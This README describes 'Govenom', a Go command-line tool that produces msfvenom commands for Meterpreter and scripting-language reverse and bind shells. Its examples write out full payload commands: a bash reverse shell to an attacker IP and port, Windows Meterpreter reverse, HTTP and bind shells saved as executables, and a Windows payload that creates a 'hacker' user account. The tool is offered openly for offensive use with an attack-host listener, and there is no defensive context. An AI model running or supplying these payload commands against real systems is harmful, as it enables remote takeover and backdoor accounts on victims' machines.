# Govenom
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com) 

Generate MSFVenom shells in command line :)

## To-do List
- [x] v0.1 Generate MSFVenom shells in command line.
   - [ ] v0.1.1 Use Cobra lib instead of Cli lib.
- [ ] v0.2 Support Bind Shell and Reverse Shell.
- [ ] v0.3 Supported Command execution and generate a Litener.
- [ ] v0.4 Provide WebUI or GUI.

## Usage
This panel appears when typing `./Govenom -h` :
```
USAGE:
   Govenom [global options] command [command options] [arguments...]

COMMANDS:
   linux    Generate Linux Meterpreter reverse/bind shell x86 multi stage :)
   windows  Generate Windows Meterpreter muti shells :)
   macos    Generate MacOS Meterpreter reverse/bind shells :)
   bash     Generate a Bash reverse shell
   python   Generate a Python reverse shell
   perl     Generate a Perl reverse shell
   asp      Generate a ASP Meterpreter shell
   jsp      Generate a Jsp reverse shell
   war      Generate a War reverse shell
   php      Generate a PHP reverse shells
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h  show help
```

## Examples
It is possible to provide the attacker IP address and listening port with the flags `-lhost` and `-port`.
```
# ./Govenom bash -lhost 1.2.3.4 -port 4444                                                                                                                                                          
Govenom - (c)2021 - arch3rPro 
Note that you need to generate a listener by msfconsole on your attack Host !

msfvenom -p cmd/unix/reverse_bash LHOST=1.2.3.4 LPORT=4444 -f raw > shell.sh 
```
```
# ./Govenom  windows
Govenom - (c)2021 - arch3rPro 
Note that you need to generate a listener by msfconsole on your attack Host !

 #1   Windows Meterpreter reverse shell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > shell.exe 
 #2   Windows Meterpreter http reverse shell: msfvenom -p windows/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4444 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe 
 #3   Windows Meterpreter bind shell: msfvenom -p windows/meterpreter/bind_tcp RHOST= 192.168.1.1 LPORT=4444 -f exe > shell.exe 
 #4   Windows CMD Multi Stage: msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > shell.exe 
 #5   Windows add user: msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

## Thanks
* [goshell](https://github.com/eze-kiel/goshell) - Generate reverse shells in command line with Go ! 
